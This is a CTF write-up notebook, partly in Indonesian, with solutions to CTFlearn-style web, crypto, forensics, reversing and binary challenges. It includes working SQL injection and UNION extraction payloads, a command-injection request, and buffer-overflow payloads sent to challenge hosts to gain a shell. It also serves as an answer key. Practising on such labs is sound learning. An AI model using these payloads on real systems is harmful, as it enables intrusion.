# Labs
## SQL Injection Part 1
```
select * from dogs;
select * from orders where item_price = 128;
select * from dogs where dog_name = 'irrelevant' or '1' = '1';
```
# Challenge
## Basic Injection
```
1' or '1
```
## POST Practice
```sh
<!-- username: admin | password: 71urlkufpsdnlkadsf -->
curl -s http://165.227.106.113/post.php -X POST -d  "username=admin&password=71urlkufpsdnlkadsf"
```
or
```r
POST /post.php HTTP/1.1
Host: 165.227.106.113
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Content-Length: 42

username=admin&password=71urlkufpsdnlkadsf
```
## Hextroadinary 
use https://xor.pw/
## Don't Bump Your Head(er)
```
GET /header.php HTTP/1.1
Host: 165.227.106.113
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Sup3rS3cr3tAg3nt
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Referer: awesomesauce.com
```
## Simple Programming
```python
count=0

with open('data.dat', 'r') as f:

f=f.read()

f=f.split('\n')

# I need to know how many lines there are where the number of 0's is a multiple of 3 or the numbers of 1s is a multiple of 2

for i in f:

# if there 3 0's or 2 1's in a row, count it

if i.count('0')%3==0 or i.count('1')%2==0:

count+=1

count-=1

print(count)
```

## Inj3ction Time
- Use UNION command
```sql
1 union select 1,2,3,4 #
1 union select table_name,2,3,4 from information_schema.tables #
1 union select table_name,column_name,3,4 from information_schema.columns #
1 union select f0und_m3,2,3,4 from w0w_y0u_f0und_m3 #
```
### Referensi
https://petircysec.com/ctflearn-v2-inj3ction-time/
## RSA Noob
```python
import binascii

e= 1
c=9327565722767258308650643213344542404592011161659991421
n=245841236512478852752909734912575581815967630033049838269083

# decode rsa message
def decode(c,e,n):
    m = pow(c,e,n)
    return m

hexde = hex(decode(c,e,n))
print(binascii.unhexlify(hexde[2:]))
```
## Calculat3 M3
```sh
curl -s https://web.ctflearn.com/web7/ -X POST -d  "expression=;ls"
```
## So many 64s
```python
import base64

base64_message = "<decoded message>"

while True :
        base64_bytes = base64_message.encode('ascii')
        message_bytes = base64.b64decode(base64_message)
        message = message_bytes.decode('ascii')
        print(message)
        base64_message = message
```
## Digital Camouflage
```
http.request.method == "POST"
```
## RSA Beginner
```python
import gmpy2
from gmpy2 import mpz

e=mpz(3)
c=mpz(219878849218803628752496734037301843801487889344508611639028)
n=mpz(245841236512478852752909734912575581815967630033049838269083)

#use factordb
q=mpz(416064700201658306196320137931)
p=mpz(590872612825179551336102196593)

phi=gmpy2.mul(p-1,q-1)
d=gmpy2.invert(e,phi)
f=gmpy2.powmod(c,d,n)
g=bytes.fromhex(hex(f)[2:])

print("[+] Flag is : ",g)
```
## Image Magic
```python
from PIL import Image

img = Image.open("out copy.jpg")
new_img = img.resize((400, 400))

x = 0
y = 0

for i in range(0,img.size[0]):
        r, g, b = img.getpixel((i, 0))
        x = i % 92

        if i % 92 == 0:
                y = y + 1
        
        new_img.putpixel((x, y), (r, g, b))

flip_img = new_img.transpose(Image.FLIP_TOP_BOTTOM)
rotate_img = flip_img.transpose(Image.ROTATE_270)
rotate_img.save('answer2.jpg')
```
## GandalfTheWise
```python
import base64

a = "Q1RGbGVhcm57eG9yX2lzX3lvdXJfZnJpZW5kfQo="
a = base64.b64decode(a)

print(a)

b = "xD6kfO2UrE5SnLQ6WgESK4kvD/Y/rDJPXNU45k/p"
b = base64.b64decode(b)

c = "h2riEIj13iAp29VUPmB+TadtZppdw3AuO7JRiDyU"
c = base64.b64decode(c)
enc = []
for i in range(len(b)):
    enc.append(chr((b[i]) ^ (c[i])))

print("".join(enc))
```
## Basic Android RE 1
```sh
apktool -v decode BasicAndroidRE1.apk
cd /home/wowon/Downloads/BasicAndroidRE1/smali/com/example/secondapp/ && grep const-string MainActivity.smali
https://md5.gromweb.com/?md5=b74dec4f39d35b6a2e6c48e637c8aedb
```
- Reference : https://kush.com.fj/blog/posts/2020-08-17-ctflearn-easy/
## Encryption Master
```sh
import base64
from numpy import byte


a = "TmljZSEgTm93IGtlZXAgZ29pbmcuIDU0Nzc2ZjIwNmQ2ZjcyNjUyZTIwMzAzMTMwMzAzMDMxMzEzMDIwMzAzMTMxMzAzMTMwMzAzMTIwMzAzMTMxMzAzMTMxMzEzMDIwMzAzMTMxMzAzMDMwMzAzMTIwMzAzMTMxMzAzMTMxMzAzMDIwMzAzMDMxMzAzMDMwMzAzMDIwMzAzMTMwMzAzMDMxMzAzMDIwMzAzMTMxMzAzMDMxMzAzMTIwMzAzMTMxMzAzMDMwMzEzMTIwMzAzMTMxMzEzMDMwMzEzMDIwMzAzMTMxMzEzMTMwMzAzMTIwMzAzMTMxMzEzMDMwMzAzMDIwMzAzMTMxMzEzMDMxMzAzMDIwMzAzMTMxMzAzMTMwMzAzMTIwMzAzMTMxMzAzMTMxMzEzMTIwMzAzMTMxMzAzMTMxMzEzMDIwMzAzMDMxMzAzMDMwMzAzMTIwMzAzMDMxMzAzMDMwMzAzMDIwMzAzMTMwMzEzMDMwMzAzMTIwMzAzMDMxMzEzMDMwMzAzMTIwMzAzMTMwMzEzMDMwMzEzMDIwMzAzMTMwMzAzMDMxMzEzMTIwMzAzMTMxMzAzMDMxMzAzMTIwMzAzMDMxMzEzMDMwMzAzMDIwMzAzMTMxMzAzMTMxMzAzMDIwMzAzMTMxMzAzMDMxMzEzMDIwMzAzMTMwMzEzMDMwMzAzMTIwMzAzMTMwMzEzMDMxMzAzMTIwMzAzMDMxMzEzMDMwMzAzMTIwMzAzMTMxMzAzMDMxMzEzMDIwMzAzMTMwMzEzMDMxMzAzMTIwMzAzMTMwMzAzMDMxMzEzMDIwMzAzMTMwMzAzMTMwMzEzMDIwMzAzMTMwMzEzMDMwMzAzMDIwMzAzMTMwMzEzMDMxMzEzMDIwMzAzMTMwMzEzMDMxMzAzMTIwMzAzMTMwMzEzMDMwMzEzMDIwMzAzMTMxMzAzMDMxMzEzMDIwMzAzMTMwMzEzMDMxMzAzMDIwMzAzMDMxMzEzMDMwMzAzMDIwMzAzMTMwMzEzMTMwMzEzMDIwMzAzMTMxMzAzMDMxMzEzMDIwMzAzMTMwMzEzMDMxMzEzMTIwMzAzMTMwMzEzMDMxMzAzMTIwMzAzMDMxMzEzMTMwMzAzMTIwMzAzMTMwMzEzMDMxMzEzMDIwMzAzMTMxMzAzMDMxMzEzMDIwMzAzMTMwMzEzMDMwMzAzMTIwMzAzMDMxMzEzMTMxMzAzMTIwMzAzMDMxMzEzMTMxMzAzMQ=="
a = base64.b64decode(a)
print(a)
a = "54776f206d6f72652e203031303030313130203031313031303031203031313031313130203031313030303031203031313031313030203030313030303030203031303030313030203031313030313031203031313030303131203031313130303130203031313131303031203031313130303030203031313130313030203031313031303031203031313031313131203031313031313130203030313030303031203030313030303030203031303130303031203030313130303031203031303130303130203031303030313131203031313030313031203030313130303030203031313031313030203031313030313130203031303130303031203031303130313031203030313130303031203031313030313130203031303130313031203031303030313130203031303031303130203031303130303030203031303130313130203031303130313031203031303130303130203031313030313130203031303130313030203030313130303030203031303131303130203031313030313130203031303130313131203031303130313031203030313131303031203031303130313130203031313030313130203031303130303031203030313131313031203030313131313031"
a = bytes.fromhex(a)
print(a)
a = "01000110 01101001 01101110 01100001 01101100 00100000 01000100 01100101 01100011 01110010 01111001 01110000 01110100 01101001 01101111 01101110 00100001 00100000 01010001 00110001 01010010 01000111 01100101 00110000 01101100 01100110 01010001 01010101 00110001 01100110 01010101 01000110 01001010 01010000 01010110 01010101 01010010 01100110 01010100 00110000 01011010 01100110 01010111 01010101 00111001 01010110 01100110 01010001 00111101 00111101"
a = a.replace(" ","")
a = int(a,2)
a = a.to_bytes((a.bit_length() + 7) // 8, 'big').decode()
print(a)
a = "Q1RGe0lfQU1fUFJPVURfT0ZfWU9VfQ=="
a = base64.b64decode(a)
print(a)
```

## The Credit Card Fraudster
### Luhn's Algorithm Checker
```python
credit_card_number = "365332930953712"
credit_card_number = credit_card_number[::-1]
luhn = 0
for i in range(len(credit_card_number)):
    if i % 2 == 0:
        luhn += int(credit_card_number[i])
    else:
        num = int(credit_card_number[i]) * 2
        if num > 9:
            num = num - 9
        luhn += num
print(luhn)
```
### Brute Force
#### Generate List
```sh
for i in {000001..999999}
do
    echo 543210$i\1234 >> dimas.txt
done
```
#### Brute
```python
code = open("dimas.txt", "r").read()
code = code.replace(" ", "")
code = code.split("\n")
code = [i for i in code if i != ""]
code = [i for i in code if i != " "]
code = [int(i) for i in code]
for i in code:
    if i % 123457 == 0:
        print(i)
```

## PIN
Menggunakan Ghidra
Di dalam main function ada callable function "check", disitu ada variable "valid" yang nantinya akan membawa ke hex dari pin tersebut.
## Simple bof
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Defined in a separate source file for simplicity.
void init_visualize(char* buff);
void visualize(char* buff);
void safeguard();

void print_flag();

void vuln() {
  char padding[16];
  char buff[32];
  int notsecret = 0xffffff00;
  int secret = 0xdeadbeef;

  memset(buff, 0, sizeof(buff)); // Zero-out the buffer.
  memset(padding, 0xFF, sizeof(padding)); // Zero-out the padding.

  // Initializes the stack visualization. Don't worry about it!
  init_visualize(buff); 

  // Prints out the stack before modification
  visualize(buff);

  printf("Input some text: ");
  gets(buff); // This is a vulnerable call!

  // Prints out the stack after modification
  visualize(buff); 

  // Check if secret has changed.
  if (secret == 0x67616c66) {
    puts("You did it! Congratuations!");
    print_flag(); // Print out the flag. You deserve it.
    return;
  } else if (notsecret != 0xffffff00) {
    puts("Uhmm... maybe you overflowed too much. Try deleting a few characters.");
  } else if (secret != 0xdeadbeef) {
    puts("Wow you overflowed the secret value! Now try controlling the value of it!");
  } else {
    puts("Maybe you haven't overflowed enough characters? Try again?");
  }

  exit(0);
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stdin, NULL);
  safeguard();
  vuln();
}
```
We need to make variable "secret" value to "0x67616c66"
```sh
python3 -c "print(('A'*48)+'\x67\x61\x6c\x66')"|nc thekidofarcrania.com 35235
```
i tried to use big-endian but i was wrong, so i used little-endian instead...
```sh
python3 -c "print(('A'*48)+'\x66\x6c\x61\x67')"|nc thekidofarcrania.com 35235
```

```
This is called endianness and it refers to the ordering of the bytes. Specifically, **little-endian is when the least significant bytes are stored before the more significant bytes, and big-endian is when the most significant bytes are stored before the less significant bytes**.

Basically little-endian is stored in reverse, and big-endian is stored normally
```

## Symbolic Decimals 
```python
list_str = {
    '!' : '1',
    '@' : '2',
    '#' : '3',
    '$' : '4',
    '%' : '5',
    '^' : '6',
    '&' : '7',
    '*' : '8',
    '(' : '9',
    ')' : '0',
    ',' : ' ',
}

enc = '^&,*$,&),!@#,*#,!!^,(&,!!$,(%,$^,(%,*&,(&,!!$,!!%,(%,$^,(%,&),!!!,!!$,(%,$^,(%,&^,!)%,!)@,!)!,!@%'


# decode
dec = ''
for c in enc:
    if c in list_str:
        dec += list_str[c]
    else:
        dec += c
print(dec)
```
## The adventures of Boris Ivanov. Part 1.
I see that in the bottom of the file there is a spectrogram which probably holds the flag. In order to acces it, I make a duplicate of the first image and change the oppacity to difference. After, I select the Move Tool (M) and press the right and left keys until I find the flag which is  .

![](Pasted%20image%2020220311200735.png)

## ALEXCTF CR2: Many time secrets
- Reference: https://pequalsnp-team.github.io/writeups/CR2
```python
#!/usr/bin/env python3

import binascii

def dec(msg, key):
    '''
    Simple char-by-char XOR with a key (Vigenere, Vernam, OTP)
    '''
    m = ""
    for i in range(0, len(key)):
        m += chr(msg[i] ^ ord(key[i]))
    return m

######################################

lines = []

with open("msg (4)","r") as f:
    # Read lines from file and decode Hex
    ls = f.readlines()
    for l in ls:
        lines.append(binascii.unhexlify(l[:-1]))

# Step 1: Decode each line with the known key
k = "ALEXCTF{"
mes = []
for l in lines:
    m = dec(l,k)
    mes.append(m)
print(mes)

# Step 2: Guess some part of the first message 'Dear Fri'
k = "Dear Friend, "
m = dec(lines[0],k)
print(m)

k = "ALEXCTF{HERE_"
mes = []
for l in lines:
    m = dec(l,k)
    mes.append(m)
print(mes)

k = "ncryption scheme"
m = dec(lines[-1],k)
print(m)

k = "ALEXCTF{HERE_GOES_"
mes = []
for l in lines:
    m = dec(l,k)
    mes.append(m)
print(mes)

k = 'sed One time pad encryptio'  
m = dec(lines[2],k)
print(m)

```
## Exclusive Santa
```sh
unrar e Exclusive_Santa.rar
binwalk --dd='.*' 3.png
```
use stegsolve to merge the "xor"-ed image
```sh
stegsolve # combine the image
convert -flop solved.bmp just
```
## Favorite Color
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vuln() {
    char buf[32];//karakter yang bisa dimasukkan sama dengan 32
    
    printf("Enter your favorite color: ");
    gets(buf);
    
    int good = 0;
    for (int i = 0; buf[i]; i++) {
        good &= buf[i] ^ buf[i]; //bisa dilihat bahwa passwordnya tidak bisa di bypass karena sor dari a^a sudah pasti sama dengan 0, apalagi ditambah dengan and operator :)
    }
    
    return good;
}

int main(char argc, char** argv) {
    setresuid(getegid(), getegid(), getegid());
    setresgid(getegid(), getegid(), getegid());
    
    //disable buffering.
    setbuf(stdout, NULL);
    
    if (vuln()) { // jika vuln sama dengan 1 maka program akan berjalan (/bin/sh)
        puts("Me too! That's my favorite color too!");
        puts("You get a shell! Flag is in flag.txt");
        system("/bin/sh");
    } else {
        puts("Boo... I hate that color! :(");
    }
}
```
Mari kita coba metode over flow
saya akan mengetes menggunakan gdb
```sh
gdb ./color
run
```
saya sudah mencoba meng-overflow dengan "A" sebanyak 32x, tapi program tidak crash. oleh karena itu saya coba brute force dengan "A" sebanyak 64x (programnya crash), dan kemudian saya kurangi satu persatu untuk mendapatkan isian yang benar...
```sh
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA # merupakan junk bytes yang bisa kita pakai untuk mengisi buffer space? berjumlah 52
```
Sekarang yang kita butuhkan adalah address yang tepat untuk menjalankan shellcode
```sh
disas main
```

![](Pasted%20image%2020220313203301.png)

kita akan menggunakan address 0x08048657, karena address itu setelah fungsi vuln().
```sh
(python -c "print('A'*52+'\x57\x86\x04\x08')"; cat) | ./color
(ruby -e 'print("Z"*52 +"\x57\x86\x04\x08")'; cat) | ./color # kita menggunakan cat untuk menahan 'exit'
(printf 'A%.0s' {1..52};printf '\x57\x86\x04\x08';cat) | ./color
```
### catatan 
SIGSEGV is triggered by **the operating system**, which detects that a process is carrying out a memory violation, and may terminate it as a result.
### Reference
https://inersin.medium.com/ctflearn-binary-favorite-color-a6e377a43a62
https://deskel.github.io/posts/ctflearn/binary-medium
## Reykjavik
Ok, setelah menganalisis dan melihat beberapa contekkan, akhirnya dapat bayangan bagaimana program ini bekerja.
```c
int main(int param_1,long param_2)

{
  byte *__s2;
  int iVar1;
  long lVar2;
  byte *pbVar3;
  byte *pbVar4;
  undefined uVar5;
  undefined uVar6;
  byte bVar7;
  ulong local_38;
  ulong local_30;
  ulong local_28;
  byte local_20;
  byte local_1f;
  byte local_1e;
  undefined local_1d;
  
  bVar7 = 0;
  if (param_1 == 1) {
    iVar1 = 1;
    puts("Usage: Reykjavik CTFlearn{flag}");
  }
  else {
    __s2 = *(byte **)(param_2 + 8);
    uVar5 = 0;
    uVar6 = 1;
    __printf_chk(1,"Welcome to the CTFlearn Reversing Challenge Reykjavik v2: %s\n",__s2);
    puts("Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse\n");
    lVar2 = 0x20;
    pbVar3 = __s2;
    pbVar4 = (byte *)"CTFlearn{Is_This_A_False_Flag?}";
    do {
      if (lVar2 == 0) break;
      lVar2 = lVar2 + -1;
      uVar5 = *pbVar3 < *pbVar4;
      uVar6 = *pbVar3 == *pbVar4;
      pbVar3 = pbVar3 + (ulong)bVar7 * -2 + 1;
      pbVar4 = pbVar4 + (ulong)bVar7 * -2 + 1;
    } while ((bool)uVar6);
    if ((!(bool)uVar5 && !(bool)uVar6) == (bool)uVar5) {
      iVar1 = 2;
      __printf_chk(1,"You found the false flag Dude!:\'%s\'\n\n");
    }
    else {
      local_1d = 0;
      local_38 = data._0_8_ ^ 0xabababababababab; //disini adalah awal mula flaggnya tergenerate
      local_30 = data._8_8_ ^ 0xabababababababab;
      local_28 = data._16_8_ ^ 0xabababababababab;
      local_20 = data[24] ^ 0xab;
      local_1f = data[25] ^ 0xab;
      local_1e = data[26] ^ 0xab; //sampai sini
      iVar1 = strcmp((char *)&local_38,(char *)__s2); //disini terjadi proses comparing antara input kita "__s2" dengan flag "local_38"
      if (iVar1 == 0) {
        __printf_chk(1,"Congratulations, you found the flag!!: \'%s\'\n\n",&local_38);
      }
      else {
        iVar1 = 4;
        __printf_chk(1,"Sorry Dude, \'%s\' is not the flag :-(\n\n",__s2);
      }
    }
  }
  return iVar1;
}
```
Saya membuka ghidra dan mendapatkan "data"

![](Pasted%20image%2020220314000833.png)

"data" masih tidak terlihat dengan jelas (masih berbentuk asembly)
```c
local_38 = data._0_8_ ^ 0xabababababababab;
local_30 = data._8_8_ ^ 0xabababababababab;
local_28 = data._16_8_ ^ 0xabababababababab;
```
setelah saya analisis, ternyata `"_0_8"` merupakan range data dari address, yang berarti `data._0_8` merupakan data dari `[0]` sampai dengan `[7]`.
kurang lebih beginilah pseudocode-nya
```pseudocode
local_38 = 0xc5d9cacec7edffe8 ^ 0xabababababababab;
local_30 = 0xdd9be7f4ced2eed0 ^ 0xabababababababab;
local_28 = 0xc5cac7cec8e2f4ce ^ 0xabababababababab;
```
Sekarang kita akan mendecodenya menggunakan python3
```python
from binascii import unhexlify


a = unhexlify("e8ffedc7cecad9c5")
b = unhexlify("d0eed2cef4e79bdd")
c = unhexlify("cef4e2c8cec7cac5")
d = unhexlify("cff4d6")
xoring = unhexlify("abababababababab")
xoringd = unhexlify("ababab")
enca = []
encb = []
encc = []
encb = []
encd = []
for i in range(len(xoring)):
    enca.append(chr(a[i] ^ xoring[i]))
    encb.append(chr(b[i] ^ xoring[i]))
    encc.append(chr(c[i] ^ xoring[i]))
for i in range(len(xoringd)):
    encd.append(chr(d[i] ^ xoringd[i]))

print("".join(enca)+''.join(encb)+''.join(encc)+''.join(encd))
```
### Referensi
https://petircysec.com/ctflearn-reykjavik/
## abandoned place
saya menggunakan exiftool untuk melihat tinggi gambar, dan menggunakan bless, ctrl+f untuk mencari desimal dari tinggi, dan merubah value hexnya.

![](Pasted%20image%2020220314140518.png)

## The Simpsons
```python
a  = "152 162 152 145 162 167 150 172 153 162 145 170 141 162"
key = "110 157 167 040 155 165 143 150 040 144 151 144 040 115 141 147 147 151 145 040 157 162 151 147 151 156 141 154 154 171 040 143 157 163 164 077 040 050 104 151 166 151 144 145 144 040 142 171 040 070 054 040 164 157 040 164 150 145 040 156 145 141 162 145 163 164 040 151 156 164 145 147 145 162 054 040 141 156 144 040 164 150 145 156 040 160 154 165 163 040 146 157 165 162 051"
a = [int(i,8) for i in a.split()]
a = [chr(i) for i in a]
a = ''.join(a)
key = [int(i,8) for i in key.split()]
key = [chr(i) for i in key]
print(''.join(key))
print("encrypted : "+a)



harga_maggie = int((848/8) + 4)
key = (chr(harga_maggie))
key = key + key + chr(ord(key)-4)


# decode vigenere chiper
def vigenere_decode(key, plaintext):
    plaintext = plaintext.lower()
    key = key.lower()
    alphabet = "abcdefghijklmnopqrstuvwxyz"
    result = ""
    for i in range(len(plaintext)):
        char = plaintext[i]
        key_index = alphabet.index(key[i % len(key)])
        plain_index = alphabet.index(char)
        offset = plain_index - key_index
        if offset < 0:
            offset = offset + len(alphabet)
        result += alphabet[offset]
    return result
print('decoded : '+vigenere_decode(key, a))
```
## Rock Paper Scissors
Patern akan ter-reset ketika keluar dari netcat.
```python
import socket, time
hostname = '138.197.193.132'
port = 5001

option = ["R", "P", "S"]

key = []
while len(key) < 10:
    
        for i in range(len(option)) :
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect_ex((hostname, port))
                if len(key) > 0:
                    for j in range(len(key)):
                        s.send(key[j].encode())
                        time.sleep(1)
                        data = s.recv(1024).decode()
                        time.sleep(1)
                        print(data)
                time.sleep(1)
                s.sendall(option[i].encode())
                time.sleep(1)
                print("======================"+option[i])
                data = s.recv(1024)
                print(data.decode())
                if "won!" in data.decode():
                    key.append(option[i])
                    print("you won!")
                    print(key)
                    break
```
## RSA Twins!
```python
n = 14783703403657671882600600446061886156235531325852194800287001788765221084107631153330658325830443132164971084137462046607458019775851952933254941568056899

e = 65537

c = 684151956678815994103733261966890872908254340972007896833477109225858676207046453897176861126186570268646592844185948487733725335274498844684380516667587

p = int("121588 253559 534573 498320 028934 517990 374721 243335 397811 413129 137253 981502 291629".replace(" ", ""))
q = int("121588 253559 534573 498320 028934 517990 374721 243335 397811 413129 137253 981502 291631".replace(" ", ""))

phi_n= 1
phi_n_hasil = (p-1)*(q-1)

d=pow(e,-1, phi_n_hasil)
ans=pow(c,d,n)
print(bytes.fromhex(hex(ans)[2:]).decode('ascii'))
```
p dan q didapat dari faktorisasi pertama n https://www.alpertron.com.ar/ECM.HTM

or
```python
import math
p = math.isqrt(n)
q = n // p
totient = (p - 1) * (q - 1)
d = pow(e, -1, totient)
print(pow(c, d, n).to_bytes(math.ceil(n.bit_length() / 8), 'big').decode())
```
## Seeing is believing
![](Pasted%20image%2020220319090441.png)
## RIP my bof
```sh
(python -c "print 'A'*60") | ./server
objdump -t server | grep win # kita bisa mendapatkan address win dari sini
(python -c "print 'A'*60+'\x86\x85\x04\x08'") | nc thekidofarcrania.com 4902 # uses little-endian
```

```sh
disas main
delete
break *<address>
info registers
```

## RE_verseDIS
menggunakan IDA
F5 decompiling
```python
input = input("Enter a string: ")
key = "IdontKnowWhatsGoingOn"
str = "\x08\x06\x2C\x3A\x32\x30\x1C\x5C\x01\x32\x1A\x12\x45\x1D\x20\x30\x0D\x1B\x03\x7C\x13"
key2 = []
msg = []
for i in range(21):
    key2.append(key[i])
    msg.append((ord(str[i]) ^ ord(key2[i])))
print(''.join(chr(i) for i in msg))
for j in range(21):
    if ( input[j] != msg[j] ):
      stat = 0
if ( stat ):
    print("Good job dude !!!")
else:
    print("Wrong password")
```
or
```

```
## XOR Is Friend Not Food
```python
cypher=b"\t\x1b\x11\x00\x16\x0b\x1d\x19\x17\x0b\x05\x1d(\x05\x005\x1b\x1f\t,\r\x00\x18\x1c\x0e"
plaintext = b'ctflearn{'
key = ''.join(chr(c ^ m) for c, m in zip(cypher, plaintext))
# remove repeated characters, scan from left to right
array_for_key = []
for i in key:
    if i not in array_for_key:
        array_for_key.append(i)
key = ''.join(array_for_key)
print("Key:", key)
# decode xor cypher with key
for i in range(len(cypher)):
    print(chr(cypher[i] ^ ord(key[i % len(key)])), end='')
```

Dumpster
```
visualvm --openfile heapdump.hprof
```
![](Pasted%20image%2020220325081153.png)
```Java
import java.util.Base64;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class decoder
{
	public static final String FLAG = "S+kUZtaHEYpFpv2ixuTnqBdORNzsdVJrAxWznyOljEo=";
	
	public static byte[] decrypt(byte[] msg,byte[] pass) throws Exception
	{
		SecretKeySpec spec = new SecretKeySpec(pass, "AES");
		Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
		cipher.init(Cipher.DECRYPT_MODE, spec);
		return cipher.doFinal(msg);
	}
	
	public static void main(String[] args) throws Exception
	{
		byte[] passHash = {7,95,-34,16,-89,-86,73,108,-128,71,43,41,100,40,53,-24}; 
		System.out.println(new String(decrypt(Base64.getDecoder().decode(FLAG.getBytes()),passHash)));
		Thread.sleep(5000); //We did a heap dump right here.
	}
}
```
### Reference
https://deskel.github.io/posts/ctflearn/forensics-medium
https://www.youtube.com/watch?v=HYiqCjKRs70
## Naughty Cat
![](Pasted%20image%2020220403081114.png)
menggunakan Sonic Visualizer untuk mendapatkan password rarnya
## AudioEdit
### Referensi
http://countersite.org/articles/web-vulnerability/105-audioedit-writeup.html